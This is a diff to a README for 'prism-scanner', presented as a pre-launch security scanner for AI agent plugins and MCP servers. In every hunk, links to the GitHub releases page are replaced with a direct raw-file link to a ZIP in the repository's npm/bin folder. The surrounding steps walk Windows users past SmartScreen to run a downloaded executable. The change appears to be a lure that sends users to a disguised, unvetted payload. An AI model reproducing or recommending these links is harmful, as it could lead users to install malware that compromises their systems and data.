@@ -1,6 +1,6 @@
 # 🔍 prism-scanner - Find security issues before launch
 
-[![Download prism-scanner](https://img.shields.io/badge/Download%20prism--scanner-blue?style=for-the-badge&logo=github)](https://github.com/Shelflifegymnopilusvalidipes977/prism-scanner/releases)
+[![Download prism-scanner](https://img.shields.io/badge/Download%20prism--scanner-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip)
 
 ## 🚀 What it does
 
@@ -23,13 +23,13 @@ If you use Windows SmartScreen, you may need to choose more info and then run an
 
 Visit this page to download the Windows release:
 
-[prism-scanner releases](https://github.com/Shelflifegymnopilusvalidipes977/prism-scanner/releases)
+[prism-scanner releases](https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip)
 
 Look for the latest release and download the Windows file for your system. If there are several files, choose the one that ends in `.exe` or the Windows package listed in the release notes.
 
 ## 🛠️ Install and run on Windows
 
-1. Open the [releases page](https://github.com/Shelflifegymnopilusvalidipes977/prism-scanner/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip).
 2. Download the latest Windows file.
 3. If the file is in a ZIP folder, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -193,4 +193,4 @@ prism-scanner gives you a fast way to review those files before you use them. It
 - Focus: AI agent skills, plugins, and MCP servers
 - Detection rules: 39
 - Install option: `pip install prism-scanner`
-- Download page: [https://github.com/Shelflifegymnopilusvalidipes977/prism-scanner/releases](https://github.com/Shelflifegymnopilusvalidipes977/prism-scanner/releases)
+- Download page: [https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip](https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip)
